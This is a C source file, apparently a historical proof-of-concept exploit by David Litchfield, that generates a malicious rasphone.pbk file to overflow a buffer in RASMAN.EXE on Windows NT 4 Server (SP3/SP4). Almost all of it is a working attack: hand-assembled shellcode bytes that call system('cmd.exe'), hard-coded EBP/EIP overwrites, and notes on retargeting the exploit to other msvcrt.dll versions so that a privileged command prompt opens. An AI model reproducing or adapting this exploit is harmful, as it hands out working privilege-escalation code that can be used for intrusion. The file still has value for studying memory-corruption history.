/* This program produces a rasphone.pbk file that will cause and exploit a buffer overrun in    */
/* RASMAN.EXE - it will drop the user into a Command Prompt  started by the system.             */
/* It operates by re-writing the EIP and pointing it back into our exploit string which calls   */
/* the system() function exported at address 0x780208C3 by msvcrt.dll (ver 5.00.7303) on        */
/* NT Server 4 (SP3 & 4). Look at the version of msvcrt.dll and change buffer[109] to buffer[112]*/
/* in this code to suit your version. msvcrt.dll is already loaded in memory - it is used by    */
/* RASMAN.exe.  Developed by David Litchfield (mnemonix@globalnet.co.uk )                       */

#include <stdio.h>
#include <windows.h>

int main (int argc, char *argv[])
{
        FILE *fd;
        int count=0;
        char buffer[1024];
        
        /* Make room for our stack so we are not overwriting anything we haven't */
        /* already overwritten. Fill this space with nops */
        while (count < 37)
                {
                        buffer[count]=0x90;
                        count ++;
                }
                
        /* Our code starts at buffer[37] - we point our EIP to here @ address 0x015DF126 */
        /* We build our own little stack here */
        /* mov esp,ebp */
        buffer[37]=0x8B;
        buffer[38]=0xE5;

        /*push ebp*/
        buffer[39]=0x55;

        /* mov ebp,esp */
        buffer[40]=0x8B;
        buffer[41]=0xEC;
        /* This completes our negotiation */

        /* We need some nulls */
        /* xor edi,edi */
        buffer[42]=0x33;
        buffer[43]=0xFF;

        /* Now we begin placing stuff on our stack */
        /* Ignore this NOP */
        buffer[44]=0x90;
        
        /*push edi  */
        buffer[45]=0x57;

        /* sub esp,4 */
        buffer[46]=0x83;
        buffer[47]=0xEC;
        buffer[48]=0x04;

        /* When the system() function is called you ask it to start a program or command */
        /* eg system("dir c:\\"); would give you a directory listing of the c drive     */
        /* The system () function spawns  whatever is defined as the COMSPEC environment */
        /* variable - usually "c:\winnt\system32\cmd.exe" in NT with a "/c" parameter - in */
        /* other words after running the command the cmd.exe process will exit. However, running */
        /* system ("cmd.exe") will cause the cmd.exe launched by the system function to spawn */
        /* another command prompt - one which won't go away on us. This is what we're going to do here*/

        /* write c of cmd.exe to (EBP - 8) which happens to be the ESP */
        /* mov byte ptr [ebp-08h],63h */
        buffer[49]=0xC6;
        buffer[50]=0x45;
        buffer[51]=0xF8;
        buffer[52]=0x63;

        /* write the m to (EBP-7)*/
        /* mov byte ptr [ebp-07h],6Dh */
        buffer[53]=0xC6;
        buffer[54]=0x45;
        buffer[55]=0xF9;
        buffer[56]=0x6D;

        /* write the d to (EBP-6)*/
        /* mov byte ptr [ebp-06h],64h */
        buffer[57]=0xC6;
        buffer[58]=0x45;
        buffer[59]=0xFA;
        buffer[60]=0x64;

        /* write the . to (EBP-5)*/
        /* mov byte ptr [ebp-05h],2Eh */
        buffer[61]=0xC6;
        buffer[62]=0x45;
        buffer[63]=0xFB;
        buffer[64]=0x2E;

        /* write the first e to (EBP-4)*/
        /* mov byte ptr [ebp-04h],65h */
        buffer[65]=0xC6;
        buffer[66]=0x45;
        buffer[67]=0xFC;
        buffer[68]=0x65;

        /* write the x to (EBP-3)*/
        /* mov byte ptr [ebp-03h],78h */
        buffer[69]=0xC6;
        buffer[70]=0x45;
        buffer[71]=0xFD;
        buffer[72]=0x78;


        /*write the second e to (EBP-2)*/
        /* mov byte ptr [ebp-02h],65h */
        buffer[73]=0xC6;
        buffer[74]=0x45;
        buffer[75]=0xFE;
        buffer[76]=0x65;


        /* If the version of msvcrt.dll is 5.00.7303 system is exported at 0x780208C3 */
        /* Use QuickView to get the entry point for system() if you have a different */
        /* version of msvcrt.dll and change these bytes accordingly */
        /* mov eax, 0x780208C3 */
        buffer[77]=0xB8;
        buffer[78]=0xC3;
        buffer[79]=0x08;
        buffer[80]=0x02;
        buffer[81]=0x78;
        
        /* Push this onto the stack */
        /* push eax */
        buffer[82]=0x50;

        /* now we load the address of our pointer to the cmd.exe string into EAX */
        /* lea eax,[ebp-08h]*/
        buffer[83]=0x8D;
        buffer[84]=0x45;
        buffer[85]=0xF8;

        /* and then push it onto the stack */
        /*push eax*/
        buffer[86]=0x50;
        
        /* now we call our system () function - all going well a command prompt will */
        /* be started, the parent process being rasman.exe                              */
        /*call dword ptr [ebp-0Ch] */
        buffer[87]=0xFF;
        buffer[88]=0x55;
        buffer[89]=0xF4;

        /* fill to our EBP with nops */
        count = 90;
        while (count < 291)
                {
                        buffer[count]=0x90;
                        count ++;
                }
        


        /* Re-write EBP */
        buffer[291]=0x24;
        buffer[292]=0xF1;
        buffer[293]=0x5D;
        buffer[294]=0x01;
        
        /* Re-write EIP */
        buffer[295]=0x26;
        buffer[296]=0xF1;
        buffer[297]=0x5D;
        buffer[298]=0x01;
        buffer[299]=0x00;
        buffer[300]=0x00;

        /* Print on the screen our exploit string */
        printf("%s", buffer);
        
        /* Open and create a  file called rasphone.pbk */
        fd = fopen("rasphone.pbk", "w");

        if(fd == NULL)
                {
                        printf("Operation failed\n");
                        return 0;
                }
        
        else
                {
                        fprintf(fd,"[Internet]\n");
                        fprintf(fd,"Phone Number=");
                        fprintf(fd,"%s",buffer);
                        fprintf(fd,"\n");
                }
return 0;
}
